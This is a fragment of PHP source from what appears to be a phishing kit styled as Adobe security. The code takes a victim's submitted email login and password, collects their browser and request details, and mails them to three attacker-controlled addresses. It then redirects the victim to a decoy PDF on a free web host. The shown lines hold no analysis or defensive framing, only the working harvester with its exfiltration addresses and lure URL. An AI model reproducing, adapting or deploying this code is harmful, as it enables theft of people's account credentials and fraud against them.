...
$login = $_POST['emlamg'];
$passwd = $_POST['passdamg'];
$own = 'logs.me@yandex.com, logins.amg@gmail.com, amgghostserver@gmail.com';
$browser = $_SERVER['HTTP_USER_AGENT'];
$inj = $_SERVER["REQUEST_URI"];
$domain = 'AMG Adob3Security';
$sender = 'AMG-|#GHOST';
$subj = "$domain LOGZ";
$headers .= "From: AMG GHOST|#s3rv3r<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://cairene-briefing.000webhostapp.com/statement.pdf';
$msg = "<HTML><BODY>
 <TABLE>
...
header( "Location: https://cairene-briefing.000webhostapp.com/statement.pdf" );
}
else {
